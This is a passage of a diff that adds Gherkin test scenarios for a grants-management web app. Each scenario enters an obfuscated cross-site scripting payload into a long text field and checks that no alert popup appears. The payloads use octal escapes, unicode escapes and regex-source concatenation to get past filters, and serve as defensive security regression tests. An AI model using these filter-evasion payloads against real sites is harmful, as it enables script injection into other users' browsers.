+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                            | Field                          |
+      | ';top['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307337 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';parent['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307339 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';frames['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307342 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                   | Field                          |
+      | ';globalThis['\141\154\145\162\164']('\130\123\123');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307343 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                               | Field                          |
+      | ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307344 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                             | Field                          |
+      | ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307347 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                             | Field                          |
+      | ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307348 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                            | Field                          |
+      | ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307350 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                               | Field                          |
+      | ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307352 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                               | Field                          |
+      | ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307353 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                   | Field                          |
+      | ';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307364 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';window[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307365 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                             | Field                          |
+      | ';self[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307366 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                             | Field                          |
+      | ';this[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307371 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                             | Field                          |
+      | ';this[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307373 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';parent[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307374 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                               | Field                          |
+      | ';frames[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307376 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
